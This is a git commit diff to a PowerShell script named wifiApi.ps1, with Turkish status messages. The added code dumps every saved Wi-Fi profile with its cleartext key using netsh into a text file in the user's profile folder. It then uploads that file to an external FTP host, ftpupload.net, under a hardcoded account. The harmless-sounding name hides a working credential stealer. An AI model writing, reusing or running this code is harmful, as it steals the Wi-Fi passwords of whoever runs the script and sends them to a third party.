956ab6c85d6e4dc30a9cbeaa6c35bb113e2e50f0
berisha9625 <mehmetcakirr44@gmail.com>
2025-07-23 00:58:06 +0300

    Update wifiApi.ps1

--- wifiApi.ps1
+++ wifiApi.ps1
@@ -1,56 +1,23 @@
-# FTP bilgileri
-$ftpHost = "ftp://ftpupload.net/"
 $ftpUser = "if0_39536575"
 $ftpPass = $env:FTP_PASS
 
 if (-not $ftpPass) {
-    Write-Error "FTP_PASS ortam değişkeni ayarlı değil!"
+    Write-Error "FTP_PASS ortam degiskeni ayarli degil!"
     exit 1
 }
 
-# FTP'den dosya listesini al
+$localFile = "$env:USERPROFILE\wifipass.txt"
+netsh wlan show profile name="*" key=clear > $localFile
+
+$ftpUrl = "ftp://ftpupload.net/wifipass.txt"
+
+$webclient = New-Object System.Net.WebClient
+$webclient.Credentials = New-Object System.Net.NetworkCredential($ftpUser, $ftpPass)
+
 try {
-    $ftpRequest = [System.Net.FtpWebRequest]::Create($ftpHost)
-    $ftpRequest.Method = [System.Net.WebRequestMethods+Ftp]::ListDirectory
-    $ftpRequest.Credentials = New-Object System.Net.NetworkCredential($ftpUser, $ftpPass)
-
-    $response = $ftpRequest.GetResponse()
-    $reader = New-Object System.IO.StreamReader $response.GetResponseStream()
-    $fileList = @()
-    while (-not $reader.EndOfStream) {
-        $fileList += $reader.ReadLine()
-    }
-    $reader.Close()
-    $response.Close()
-
-    Write-Host "FTP Dosya Listesi:"
-    $fileList | ForEach-Object { Write-Host " - $_" }
-
-    # wifipass dosyalarını filtrele
-    $existingFiles = $fileList | Where-Object { $_ -match '^wifipass(\d*)\.txt$' }
-
-    Write-Host "`nBulunan wifipass dosyaları:"
-    $existingFiles | ForEach-Object { Write-Host " * $_" }
-
-    # Dosya numaralarını çıkar
-    $numbers = $existingFiles | ForEach-Object {
-        if ($_ -match '^wifipass(\d+)\.txt$') {
-            [int]$matches[1]
-        } elseif ($_ -eq "wifipass.txt") {
-            1
-        } else {
-            0
-        }
-    }
-
-    $maxNum = if ($numbers.Count -gt 0) { ($numbers | Measure-Object -Maximum).Maximum } else { 0 }
-
-    # Yeni dosya adı
-    $newFileName = if ($maxNum -eq 0) { "wifipass.txt" } else { "wifipass$($maxNum + 1).txt" }
-
-    Write-Host "`nYeni dosya adı: $newFileName"
-
-} catch {
-    Write-Error "FTP dosya listesi alınırken hata: $_"
-    exit 1
+    $webclient.UploadFile($ftpUrl, "STOR", $localFile)
+    Write-Host "Dosya basariyla FTP'ye yuklendi."
+}
+catch {
+    Write-Host "Hata olustu: $_"
 }
